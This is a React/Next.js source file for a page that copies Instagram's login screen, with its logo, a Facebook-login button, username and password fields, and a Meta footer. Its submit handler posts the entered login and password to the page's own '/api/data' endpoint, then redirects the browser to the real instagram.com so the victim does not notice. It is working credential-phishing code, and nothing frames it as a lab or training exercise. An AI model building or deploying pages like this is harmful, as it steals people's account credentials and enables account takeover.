import axios from 'axios';
import Head from 'next/head';
import Image from 'next/image';
import { useRouter } from 'next/router';
import { useState } from 'react';

export default function Home() {
	const [login, setLogin] = useState('');
	const [password, setPassword] = useState('');
	const router = useRouter();

	const submitForm = async () => {
		const res = await axios.post('/api/data', { login, password });
		console.log(res);
		router.push('https://www.instagram.com/');
	};

	return (
		<>
			<div className="container ">
				<Head>
					<title>Instagram </title>
					<link rel="icon" href="/favicon.png" />
				</Head>
				<div className="language">
					English{' '}
					<svg
						width="14"
						height="6"
						viewBox="0 0 14 6"
						fill="none"
						xmlns="http://www.w3.org/2000/svg"
					>
						<path
							fill-rule="evenodd"
							clip-rule="evenodd"
							d="M0.553069 0.893428C0.612482 0.738175 0.716377 0.620179 0.841974 0.565313C0.96757 0.510446 1.10462 0.523186 1.22307 0.60074L7.00007 4.38993L12.7761 0.599428C12.8348 0.560028 12.899 0.536284 12.9647 0.529566C13.0305 0.522847 13.0967 0.533286 13.1594 0.560282C13.2221 0.587278 13.2801 0.630296 13.3301 0.686856C13.38 0.743416 13.421 0.812399 13.4505 0.889829C13.4801 0.967259 13.4977 1.0516 13.5023 1.138C13.5069 1.22439 13.4985 1.31113 13.4774 1.39322C13.4563 1.4753 13.4231 1.5511 13.3796 1.61625C13.3362 1.68139 13.2833 1.7346 13.2241 1.7728L7.22407 5.7103C7.15454 5.75603 7.07784 5.77984 7.00007 5.77984C6.9223 5.77984 6.8456 5.75603 6.77607 5.7103L0.776069 1.7728C0.657781 1.69482 0.567879 1.55846 0.526076 1.39362C0.484273 1.22877 0.49398 1.04889 0.553069 0.893428Z"
							fill="#C5C5C5"
						/>
					</svg>
				</div>
				<div className="logo">
					<Image width={175} height={51} src="/instagram.svg" />
				</div>
				<div className="button">
					<svg
						width="32"
						height="32"
						viewBox="0 0 32 32"
						fill="none"
						xmlns="http://www.w3.org/2000/svg"
					>
						<g clip-path="url(#clip0_4_95)">
							<path
								d="M32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 23.9861 5.85097 30.6053 13.5 31.8056V20.625H9.4375V16H13.5V12.475C13.5 8.465 15.8887 6.25 19.5434 6.25C21.294 6.25 23.125 6.5625 23.125 6.5625V10.5H21.1074C19.1198 10.5 18.5 11.7333 18.5 12.9987V16H22.9375L22.2281 20.625H18.5V31.8056C26.149 30.6053 32 23.9861 32 16Z"
								fill="#1877F2"
							/>
							<path
								d="M22.2281 20.625L22.9375 16H18.5V12.9987C18.5 11.7333 19.1198 10.5 21.1074 10.5H23.125V6.5625C23.125 6.5625 21.294 6.25 19.5434 6.25C15.8887 6.25 13.5 8.46499 13.5 12.475V16H9.4375V20.625H13.5V31.8056C15.1566 32.0648 16.8434 32.0648 18.5 31.8056V20.625H22.2281Z"
								fill="white"
							/>
						</g>
						<defs>
							<clipPath id="clip0_4_95">
								<rect width="32" height="32" fill="white" />
							</clipPath>
						</defs>
					</svg>
					<span>Continue with Facebook</span>
				</div>
				<div className="divider">
					<div className="line"></div>
					<span>OR</span>
					<div className="line"></div>
				</div>
				<input
					className="my-input"
					placeholder="phone number,username, or email"
					value={login}
					onChange={(e) => setLogin(e.target.value)}
				/>
				<input
					className="my-input"
					placeholder="password"
					value={password}
					onChange={(e) => setPassword(e.target.value)}
				/>
				<div className="forgot">Forgot password?</div>
				<div
					onClick={submitForm}
					className={`log-button ${password && login ? '' : 'disabled'}`}
				>
					Log In
				</div>
				<div className="dont_have">
					Don't have an account? <span>sign up</span>
				</div>
			</div>
			<div className="footer">
				<span>from</span>
				<div className="row">
					<svg
						fill="#000000"
						xmlns="http://www.w3.org/2000/svg"
						viewBox="0 0 50 50"
					>
						<path d="M47.3,21.01c-0.58-1.6-1.3-3.16-2.24-4.66c-0.93-1.49-2.11-2.93-3.63-4.13c-1.51-1.19-3.49-2.09-5.59-2.26l-0.78-0.04	c-0.27,0.01-0.57,0.01-0.85,0.04c-0.57,0.06-1.11,0.19-1.62,0.34c-1.03,0.32-1.93,0.8-2.72,1.32c-1.42,0.94-2.55,2.03-3.57,3.15	c0.01,0.02,0.03,0.03,0.04,0.05l0.22,0.28c0.51,0.67,1.62,2.21,2.61,3.87c1.23-1.2,2.83-2.65,3.49-3.07	c0.5-0.31,0.99-0.55,1.43-0.68c0.23-0.06,0.44-0.11,0.64-0.12c0.1-0.02,0.19-0.01,0.3-0.02l0.38,0.02c0.98,0.09,1.94,0.49,2.85,1.19	c1.81,1.44,3.24,3.89,4.17,6.48c0.95,2.6,1.49,5.44,1.52,8.18c0,1.31-0.17,2.57-0.57,3.61c-0.39,1.05-1.38,1.45-2.5,1.45	c-1.63,0-2.81-0.7-3.76-1.68c-1.04-1.09-2.02-2.31-2.96-3.61c-0.78-1.09-1.54-2.22-2.26-3.37c-1.27-2.06-2.97-4.67-4.15-6.85	L25,16.35c-0.31-0.39-0.61-0.78-0.94-1.17c-1.11-1.26-2.34-2.5-3.93-3.56c-0.79-0.52-1.69-1-2.72-1.32	c-0.51-0.15-1.05-0.28-1.62-0.34c-0.18-0.02-0.36-0.03-0.54-0.03c-0.11,0-0.21-0.01-0.31-0.01l-0.78,0.04	c-2.1,0.17-4.08,1.07-5.59,2.26c-1.52,1.2-2.7,2.64-3.63,4.13C4,17.85,3.28,19.41,2.7,21.01c-1.13,3.2-1.74,6.51-1.75,9.93	c0.01,1.78,0.24,3.63,0.96,5.47c0.7,1.8,2.02,3.71,4.12,4.77c1.03,0.53,2.2,0.81,3.32,0.81c1.23,0.03,2.4-0.32,3.33-0.77	c1.87-0.93,3.16-2.16,4.33-3.4c2.31-2.51,4.02-5.23,5.6-8c0.44-0.76,0.86-1.54,1.27-2.33c-0.21-0.41-0.42-0.84-0.64-1.29	c-0.62-1.03-1.39-2.25-1.95-3.1c-0.83,1.5-1.69,2.96-2.58,4.41c-1.59,2.52-3.3,4.97-5.21,6.98c-0.95,0.98-2,1.84-2.92,2.25	c-0.47,0.2-0.83,0.27-1.14,0.25c-0.43,0-0.79-0.1-1.13-0.28c-0.67-0.35-1.3-1.1-1.69-2.15c-0.4-1.04-0.57-2.3-0.57-3.61	c0.03-2.74,0.57-5.58,1.52-8.18c0.93-2.59,2.36-5.04,4.17-6.48c0.91-0.7,1.87-1.1,2.85-1.19l0.38-0.02c0.11,0.01,0.2,0,0.3,0.02	c0.2,0.01,0.41,0.06,0.64,0.12c0.26,0.08,0.54,0.19,0.83,0.34c0.2,0.1,0.4,0.21,0.6,0.34c1,0.64,1.99,1.58,2.92,2.62	c0.72,0.81,1.41,1.71,2.1,2.63L25,25.24c0.75,1.55,1.53,3.09,2.39,4.58c1.58,2.77,3.29,5.49,5.6,8c0.68,0.73,1.41,1.45,2.27,2.1	c0.61,0.48,1.28,0.91,2.06,1.3c0.93,0.45,2.1,0.8,3.33,0.77c1.12,0,2.29-0.28,3.32-0.81c2.1-1.06,3.42-2.97,4.12-4.77	c0.72-1.84,0.95-3.69,0.96-5.47C49.04,27.52,48.43,24.21,47.3,21.01z" />
					</svg>
					Meta
				</div>
			</div>
		</>
	);
}
